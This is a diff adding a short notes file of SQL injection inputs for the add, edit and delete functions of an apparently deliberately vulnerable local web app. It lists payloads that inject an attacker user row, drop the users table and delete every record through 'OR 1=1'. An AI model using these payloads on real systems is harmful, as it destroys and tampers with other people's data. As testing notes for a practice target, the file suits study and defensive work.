@@ -1,0 +1,8 @@
+SQL Injection
+    * Add:
+        - Username: a, Email: a@a.p'); INSERT INTO users (name, email) VALUES ('attacker', 'attacker@a.p') --
+        - Username: a, Email: Robert'); DROP TABLE users; --
+    * Edit:
+        - Username: a, Email: '; DROP TABLE users; --
+    * Delete:
+        - localhost:8899/Vulnerable/delete.php?id=1 OR 1=1
